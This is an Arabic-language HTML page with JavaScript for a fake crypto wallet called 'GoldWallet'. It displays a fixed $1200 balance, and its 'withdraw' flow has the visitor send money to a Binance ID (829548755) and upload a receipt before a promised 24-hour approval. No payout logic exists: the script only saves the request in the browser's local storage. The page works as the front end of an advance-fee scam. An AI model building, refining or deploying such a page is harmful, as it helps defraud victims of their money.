<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>GoldWallet | المحفظة الذهبية</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #0a0e1a 0%, #0f172a 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
        }

        body::before {
            content: '';
            position: fixed;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 30% 40%, rgba(247, 147, 26, 0.08) 0%, transparent 60%);
            pointer-events: none;
        }

        .wallet-main {
            max-width: 520px;
            width: 100%;
            background: rgba(10, 14, 23, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 48px;
            padding: 32px 28px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(247, 147, 26, 0.15);
        }

        .balance-card {
            background: linear-gradient(135deg, #1a1f2e 0%, #0f1119 100%);
            border-radius: 36px;
            padding: 28px;
            margin-bottom: 28px;
            border: 1px solid rgba(247, 147, 26, 0.2);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .balance-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 20px;
        }

        .balance-content {
            flex: 1;
        }

        .balance-label {
            font-size: 13px;
            font-weight: 500;
            color: #94a3b8;
            letter-spacing: 0.5px;
            margin-bottom: 10px;
        }

        .balance-amount {
            font-size: 46px;
            font-weight: 800;
            color: #facc15;
            line-height: 1.1;
        }

        .balance-amount small {
            font-size: 18px;
            font-weight: 500;
            color: #cbd5e1;
        }

        .card-image {
            width: 130px;
        }

        .card-image img {
            width: 100%;
            border-radius: 16px;
            border: 2px solid rgba(247, 147, 26, 0.4);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
        }

        .btn-withdraw {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 60px;
            font-weight: 700;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #ef4444, #dc2626);
            color: white;
            box-shadow: 0 6px 14px rgba(220, 38, 38, 0.3);
        }

        .btn-withdraw:active {
            transform: scale(0.97);
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(8px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            visibility: hidden;
            opacity: 0;
            transition: all 0.3s;
        }

        .modal-overlay.active {
            visibility: visible;
            opacity: 1;
        }

        .withdraw-modal {
            background: #0f172a;
            border-radius: 40px;
            max-width: 500px;
            width: 90%;
            padding: 32px;
            border: 1px solid #f7931a;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
            transform: scale(0.9);
            transition: transform 0.3s;
            max-height: 90vh;
            overflow-y: auto;
        }

        .modal-overlay.active .withdraw-modal {
            transform: scale(1);
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }

        .modal-header h3 {
            color: #f7931a;
            font-size: 24px;
        }

        .close-modal {
            background: none;
            border: none;
            font-size: 28px;
            color: #94a3b8;
            cursor: pointer;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-group label {
            display: block;
            color: #cbd5e1;
            margin-bottom: 10px;
            font-weight: 500;
        }

        .form-group input {
            width: 100%;
            padding: 14px;
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 20px;
            color: white;
            font-size: 14px;
            outline: none;
        }

        .form-group input:focus {
            border-color: #f7931a;
        }

        .binance-info {
            background: linear-gradient(135deg, #1e293b, #0f172a);
            border-radius: 28px;
            padding: 24px;
            text-align: center;
            margin: 20px 0;
            border: 1px solid rgba(247, 147, 26, 0.3);
        }

        .binance-label {
            color: #94a3b8;
            font-size: 14px;
            margin-bottom: 12px;
        }

        .binance-address {
            background: #00000040;
            padding: 18px;
            border-radius: 20px;
            font-size: 28px;
            font-weight: 800;
            color: #f7931a;
            letter-spacing: 2px;
            font-family: monospace;
            margin: 15px 0;
            border: 1px dashed #f7931a;
        }

        .copy-btn {
            background: #f7931a;
            border: none;
            padding: 12px 24px;
            border-radius: 60px;
            font-weight: bold;
            color: #0f172a;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .instruction-text {
            color: #cbd5e1;
            font-size: 14px;
            line-height: 1.6;
            text-align: center;
            margin: 20px 0;
        }

        .upload-area {
            margin: 20px 0;
            text-align: center;
        }

        .upload-btn {
            background: #3b82f6;
            border: none;
            padding: 14px 24px;
            border-radius: 60px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .image-preview {
            margin-top: 15px;
            display: none;
        }

        .image-preview img {
            max-width: 100%;
            border-radius: 20px;
            border: 2px solid #f7931a;
        }

        .confirm-transfer {
            width: 100%;
            padding: 14px;
            background: #10b981;
            border: none;
            border-radius: 60px;
            font-weight: bold;
            font-size: 16px;
            color: white;
            cursor: pointer;
            margin-top: 10px;
        }

        .confirm-transfer:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .approve-message {
            background: #1e293b;
            border-radius: 20px;
            padding: 20px;
            text-align: center;
            margin-top: 20px;
            border-right: 4px solid #f7931a;
        }

        .toast-message {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: #1e293b;
            padding: 12px 24px;
            border-radius: 60px;
            color: #facc15;
            z-index: 2001;
            transition: 0.3s;
            border: 1px solid #f7931a;
        }

        .toast-message.show {
            transform: translateX(-50%) translateY(0);
        }

        .step-2, .step-3 {
            display: none;
        }

        hr {
            border-color: #334155;
            margin: 20px 0;
        }

        @media (max-width: 500px) {
            .wallet-main { padding: 20px; }
            .balance-amount { font-size: 32px; }
            .card-image { width: 95px; }
            .binance-address { font-size: 20px; }
        }
    </style>
</head>
<body>

<div class="wallet-main">
    <div class="balance-card">
        <div class="balance-row">
            <div class="balance-content">
                <div class="balance-label">الرصيد المتاح</div>
                <div class="balance-amount">
                    $<span id="mainBalance">1200.00</span> <small>USD</small>
                </div>
            </div>
            <div class="card-image">
                <img src="https://i.postimg.cc/T2kXXWwW/photo-2026-05-30-20-48-27.jpg" alt="بطاقتي" onerror="this.src='https://placehold.co/130x85?text=CARD'">
            </div>
        </div>
    </div>

    <button class="btn-withdraw" id="openWithdrawBtn">
        <i class="fab fa-binance"></i> سحب الأموال
    </button>
</div>

<!-- نافذة السحب -->
<div id="withdrawModal" class="modal-overlay">
    <div class="withdraw-modal">
        <div class="modal-header">
            <h3><i class="fab fa-binance"></i> سحب الأموال</h3>
            <button class="close-modal" id="closeModalBtn">&times;</button>
        </div>

        <!-- الخطوة 1: عرض عنوان التحويل وحقل عنوان المستخدم -->
        <div id="step1">
            <div class="form-group">
                <label>🏦 عنوان محفظة Binance الخاص بك (للاستلام)</label>
                <input type="text" id="userBinanceAddress" placeholder="أدخل عنوان Binance الخاص بك (BEP20)" required>
            </div>

            <div class="binance-info">
                <div class="binance-label">
                    <i class="fas fa-exchange-alt"></i> قم بالتحويل إلى عنوان المحفظة الرئيسي:
                </div>
                <div class="binance-address" id="binanceAddressDisplay">
                    829548755
                </div>
                <button class="copy-btn" id="copyAddressBtn">
                    <i class="fas fa-copy"></i> نسخ العنوان
                </button>
            </div>

            <div class="instruction-text">
                <i class="fas fa-info-circle"></i> تعليمات السحب:<br>
                1. قم بفتح تطبيق Binance الخاص بك<br>
                2. اختر "تحويل" أو "إرسال"<br>
                3. الصق العنوان: <strong>829548755</strong><br>
                4. أدخل المبلغ الذي تريد سحبه<br>
                5. قم بتأكيد التحويل<br>
                6. بعد إتمام التحويل، اضغط "لقد قمت بالتحويل"
            </div>

            <button class="confirm-transfer" id="confirmTransferBtn">
                <i class="fas fa-check-circle"></i> لقد قمت بالتحويل
            </button>
        </div>

        <!-- الخطوة 2: رفع صورة التحويل -->
        <div id="step2" class="step-2">
            <div class="form-group">
                <label>📸 قم برفع صورة إيصال التحويل من Binance</label>
                <div class="upload-area">
                    <input type="file" id="transferImage" accept="image/*" style="display: none;">
                    <button class="upload-btn" id="uploadImageBtn">
                        <i class="fas fa-cloud-upload-alt"></i> اختر صورة التحويل
                    </button>
                    <div class="image-preview" id="imagePreview">
                        <img id="previewImg" src="">
                    </div>
                </div>
            </div>
            <button class="confirm-transfer" id="submitTransferBtn" disabled>
                <i class="fas fa-paper-plane"></i> إرسال للتوثيق
            </button>
        </div>

        <!-- الخطوة 3: رسالة الانتظار -->
        <div id="step3" class="step-3">
            <div class="approve-message">
                <i class="fas fa-clock" style="font-size: 48px; color: #f7931a; margin-bottom: 15px; display: block;"></i>
                <h3 style="color: #facc15; margin-bottom: 10px;">جاري المراجعة</h3>
                <p style="color: #cbd5e1; line-height: 1.6;">
                    ✅ تم استلام طلب السحب الخاص بك<br>
                    📋 سيتم التأكد من التحويل وصورة الإيصال<br>
                    ⏱️ سيتم تأكيد العملية خلال <strong>24 ساعة</strong><br>
                    💰 بعد الموافقة، سيتم إضافة الرصيد إلى محفظتك على Binance
                </p>
                <hr>
                <p style="color: #94a3b8; font-size: 13px;">
                    <i class="fas fa-shield-alt"></i> سيتم إشعارك عند اكتمال التحويل
                </p>
            </div>
            <button class="confirm-transfer" id="closeAfterSubmit" style="background: #f7931a; margin-top: 20px;">
                <i class="fas fa-times"></i> إغلاق
            </button>
        </div>
    </div>
</div>

<div id="toastMsg" class="toast-message"></div>

<script>
    const modal = document.getElementById('withdrawModal');
    const openBtn = document.getElementById('openWithdrawBtn');
    const closeBtn = document.getElementById('closeModalBtn');
    
    // العناصر
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const step3 = document.getElementById('step3');
    
    const confirmTransferBtn = document.getElementById('confirmTransferBtn');
    const userBinanceInput = document.getElementById('userBinanceAddress');
    const copyBtn = document.getElementById('copyAddressBtn');
    const uploadImageBtn = document.getElementById('uploadImageBtn');
    const transferImageInput = document.getElementById('transferImage');
    const imagePreview = document.getElementById('imagePreview');
    const previewImg = document.getElementById('previewImg');
    const submitTransferBtn = document.getElementById('submitTransferBtn');
    const closeAfterSubmit = document.getElementById('closeAfterSubmit');
    
    const binanceAddress = '829548755';
    const toastEl = document.getElementById('toastMsg');
    
    let selectedImage = null;

    function showToast(msg, isError = false) {
        toastEl.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
        toastEl.classList.add('show');
        setTimeout(() => {
            toastEl.classList.remove('show');
        }, 4000);
    }

    // نسخ العنوان
    copyBtn.addEventListener('click', () => {
        navigator.clipboard.writeText(binanceAddress).then(() => {
            showToast('✅ تم نسخ عنوان التحويل: 829548755');
        }).catch(() => {
            showToast('❌ فشل النسخ، يمكنك نسخه يدوياً', true);
        });
    });

    // فتح النافذة
    openBtn.addEventListener('click', () => {
        userBinanceInput.value = '';
        selectedImage = null;
        previewImg.src = '';
        imagePreview.style.display = 'none';
        step1.style.display = 'block';
        step2.style.display = 'none';
        step3.style.display = 'none';
        submitTransferBtn.disabled = true;
        modal.classList.add('active');
    });

    closeBtn.addEventListener('click', () => {
        modal.classList.remove('active');
    });

    modal.addEventListener('click', (e) => {
        if (e.target === modal) modal.classList.remove('active');
    });

    // الخطوة 1: الضغط على "لقد قمت بالتحويل"
    confirmTransferBtn.addEventListener('click', () => {
        let userAddress = userBinanceInput.value.trim();
        
        if (!userAddress) {
            showToast('❌ الرجاء إدخال عنوان Binance الخاص بك للاستلام', true);
            return;
        }
        
        if (userAddress.length < 20) {
            showToast('⚠️ عنوان Binance غير صالح (يجب أن يكون عنوان BEP20 صحيحاً)', true);
            return;
        }
        
        // الانتقال للخطوة 2
        step1.style.display = 'none';
        step2.style.display = 'block';
        showToast('📸 الرجاء رفع صورة إيصال التحويل');
    });

    // رفع الصورة
    uploadImageBtn.addEventListener('click', () => {
        transferImageInput.click();
    });

    transferImageInput.addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (file) {
            if (file.size > 5 * 1024 * 1024) {
                showToast('❌ حجم الصورة كبير جداً (الحد الأقصى 5 ميجابايت)', true);
                return;
            }
            
            const reader = new FileReader();
            reader.onload = function(event) {
                previewImg.src = event.target.result;
                imagePreview.style.display = 'block';
                selectedImage = file;
                submitTransferBtn.disabled = false;
                showToast('✅ تم اختيار الصورة، يمكنك الآن إرسال الطلب');
            };
            reader.readAsDataURL(file);
        }
    });

    // إرسال الطلب (الخطوة 2 -> 3)
    submitTransferBtn.addEventListener('click', () => {
        if (!selectedImage) {
            showToast('❌ الرجاء رفع صورة التحويل أولاً', true);
            return;
        }
        
        // تخزين البيانات (في التطوير الحقيقي: إرسال إلى الخادم)
        const userAddress = userBinanceInput.value.trim();
        
        // محاكاة إرسال البيانات إلى الخادم
        // هنا في الموقع الحقيقي: fetch('/api/withdraw-request', { method: 'POST', body: formData })
        
        // الانتقال للخطوة 3
        step2.style.display = 'none';
        step3.style.display = 'block';
        
        showToast('📤 تم إرسال طلب السحب بنجاح، سيتم مراجعته قريباً');
        
        // يمكن حفظ البيانات في localStorage للتطوير
        const requestData = {
            userBinanceAddress: userAddress,
            targetAddress: binanceAddress,
            imageBase64: previewImg.src,
            timestamp: new Date().toISOString(),
            status: 'pending'
        };
        localStorage.setItem('lastWithdrawRequest', JSON.stringify(requestData));
    });

    // إغلاق النافذة بعد الانتهاء
    closeAfterSubmit.addEventListener('click', () => {
        modal.classList.remove('active');
        showToast('سيتم إشعارك عند الموافقة على طلب السحب');
    });

    // عرض أي طلب سابق (للتطوير)
    window.addEventListener('load', () => {
        showToast('المحفظة جاهزة | اضغط سحب لبدء العملية');
    });
</script>
</body>
</html>
